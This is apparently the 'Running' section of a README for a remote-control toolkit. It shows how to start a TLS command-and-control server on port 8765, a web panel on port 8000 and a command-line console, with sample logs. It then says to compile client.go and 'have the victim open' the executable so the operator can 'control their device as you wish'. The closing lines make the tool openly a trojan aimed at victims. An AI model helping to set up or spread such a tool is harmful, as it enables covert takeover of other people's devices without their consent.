# Running
After configuring the environment, first enter the `code` directory and run `server_api.py`:
```bash
cd code
python server_api.py
```
Reference running result:
```
[12/19/25 23:27:01] INFO     2025-12-19 23:27:01,837 - INFO - Copyright: Copyright © 赵博凯, All Rights Reserved.                       server_api.py:308
                    INFO     2025-12-19 23:27:01,845 - INFO - Program startup                                                                 server_api.py:288
                    INFO     2025-12-19 23:27:01,847 - INFO - Initializing server                                                             server_api.py:259
                    INFO     2025-12-19 23:27:01,849 - INFO - Certificate path: ../cert.pem, key path: ../key.pem                              server_api.py:260
                    INFO     2025-12-19 23:27:01,859 - INFO - SSL certificate loaded successfully                                          server_api.py:265
                    INFO     2025-12-19 23:27:01,861 - INFO - Starting server: 0.0.0.0:8765                                                 server_api.py:273
                    INFO     2025-12-19 23:27:01,894 - INFO - server listening on 0.0.0.0:8765                                             server.py:341
                    INFO     2025-12-19 23:27:01,897 - INFO - Server started successfully                                                   server_api.py:276
[2025-12-19 23:27:01 -0500] [1195589] [INFO] Running on http://0.0.0.0:5000 (CTRL + C to quit)
                    INFO     2025-12-19 23:27:01,904 - INFO - Running on http://0.0.0.0:5000 (CTRL + C to quit)                           logging.py:107
```

Then if you want the web interface, run `server_web.py`:
```bash
python server_web.py
```
Reference running result:
```
2025-12-19 23:30:02,843 - INFO - Copyright: Copyright © 赵博凯, All Rights Reserved.
2025-12-19 23:30:02,843 - INFO - Starting program...
[2025-12-19 23:30:02 -0500] [1198971] [INFO] Running on http://0.0.0.0:8000 (CTRL + C to quit)
2025-12-19 23:30:02,844 - INFO - Running on http://0.0.0.0:8000 (CTRL + C to quit)
```
Visit this URL and enter the password.

Or if you prefer command-line mode:
```bash
python server.py
```
Reference running result:
```
[23:33:27] [*] Copyright: Copyright © 赵博凯, All Rights Reserved.                                                                           server.py:23
[23:33:27] [*] Program startup                                                                                                             server.py:23
[23:33:27] [*] Verifying password                                                                                                         server.py:23
[23:33:27] [+] Verification successful, cookie: {'Cookie': 'e6f452c657764158a01af9db65eb2f80eb295bebe6e67fa2667a8c0d355f5c1b'}             server.py:35
(server)>
```

Finally, compile `client.go`:
```bash
go build -o <output_filename> client.go
```
Have the victim open the compiled executable file. If the configuration is correct and permissions are granted, you will be able to control their device as you wish.

That's how to get started!
